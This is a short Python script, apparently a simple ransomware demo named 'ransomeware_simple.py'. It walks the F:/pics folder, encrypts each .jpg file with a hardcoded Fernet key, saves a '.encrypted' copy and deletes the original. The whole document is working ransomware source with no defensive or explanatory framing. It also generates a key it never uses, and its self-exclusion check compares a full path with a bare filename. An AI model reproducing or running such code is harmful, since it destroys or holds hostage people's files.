import os
from cryptography.fernet import Fernet
path=os.getcwd()
path=os.chdir("F:/pics")
filelist=['jpg']

for root,_,files in os.walk(os.getcwd()):
    for f in files:
        path1=os.path.join(root,f)
        print(path1)
        if not path1.split('.')[-1] in filelist:
            continue
        else:
            if path1 != "ransomeware_simple.py":
                with open(path1, 'rb') as f:
                    data = f.read()
                key_generated = Fernet.generate_key()
                print(key_generated)
                fernnet = Fernet(b'1IV-geriWUgNSq9o9yXFtuYeok7qH6YsgR8HIQGtXQ0=')
                encrypted_data = fernnet.encrypt(data)
                print(encrypted_data)
                encrypted_file = path1 + ".encrypted"
                print("encrypted file name is: " + encrypted_file)
                try:
                    with open(encrypted_file, 'wb') as f:
                        f.write(encrypted_data)
                    os.remove(path1)
                except:
                    print("Not Permitted.........")
